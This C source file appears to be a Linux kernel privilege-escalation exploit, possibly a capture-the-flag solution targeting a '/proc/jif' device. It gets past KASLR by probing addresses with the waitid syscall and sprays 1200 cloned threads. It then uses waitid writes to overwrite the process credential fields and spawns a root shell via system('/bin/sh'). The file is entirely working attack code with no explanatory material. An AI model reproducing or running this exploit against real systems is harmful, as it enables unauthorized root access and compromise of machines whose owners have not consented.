#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <errno.h>
#include <asm/unistd_64.h>
#define STACK_SIZE 2048


int flagcheck=1;
long long int addr = 0;


long long int kaslrBypass(){
    long long int i = 0;
    pid_t pid = 0;
    for(i = (char *)0xffff880000000000; ; i+=0x10000000) {
    pid = fork();
    if (pid > 0) 
    {
        printf("[+] Trying %p\n", i);
        if(syscall(__NR_waitid, P_PID, pid, (siginfo_t *)i, WEXITED, NULL) >= 0) 
        {
            printf("[+] Found %p\n", i);
            break;
        }
    }
    else if (pid == 0)
        exit(0);
    }
    return i;
}

int spray(){
    //open("/proc/jif");
    pid_t pid;
    int fd = open("/proc/jif",O_RDWR);
    close(fd);
    int euid;
    int old = geteuid();
    while(1){
        euid = syscall(__NR_geteuid);
        if(old!=euid){
            printf("[*]success!\n");
            flagcheck=0;
            // write in gid
            
            // write in uid
            pid = fork();
            if (pid > 0) 
            {
                printf("[+] Trying to write in uid\n");
                if(syscall(__NR_waitid, P_PID, pid, (siginfo_t *)(addr - 4 - 0x10), WEXITED, NULL) >= 0) 
                {
                    printf("[+] write done!\n");
                }
            }
            else if (pid == 0)
                exit(0);

            // rewrite euid
            pid = fork();
            if (pid > 0) 
            {
                printf("[+] Trying to rewrite euid\n");
                if(syscall(__NR_waitid, P_PID, pid, (siginfo_t *)(addr - 4), WEXITED, NULL) >= 0) 
                {
                    printf("[+] rewrite done!\n");
                }
            }
            else if (pid == 0)
                exit(0);
            printf("[*]pid:%d euid:%d uid:%d\n",getpid(),geteuid(),getuid());
            system("/bin/sh");      
        }
        if(!flagcheck){
            sleep(100000);
        }
    usleep(100000);
    }
 
    return 0;
}

int main(){
    pid_t pid;
    addr = kaslrBypass() + 0x1394fed94;
    printf("spraying...\n");
    for(int i=0;i<1200;i++){
        void *stack=malloc(STACK_SIZE);
        pid = clone(spray,stack,CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SYSVSEM | SIGCHLD,NULL);
        if(pid == -1){
            perror("[-]clone failed!");
            exit(-1);
        }
    }
    printf("[*]clone success!\n");

    long long int end_addr = 0xffffc88000000000;

    for(long long int i = addr;flagcheck;i += 0x1000){
    	addr = i;
        printf("[*]attacking 0x%llx\n",addr);
        syscall(SYS_waitid, P_ALL,0,addr-4, WEXITED|WNOHANG|__WNOTHREAD, NULL);
        
        if(addr > end_addr){exit(0);}
        usleep(100000);
    }
    // write in uid
    
    // switch to child process
    sleep(1000000);
    
    return 0;
}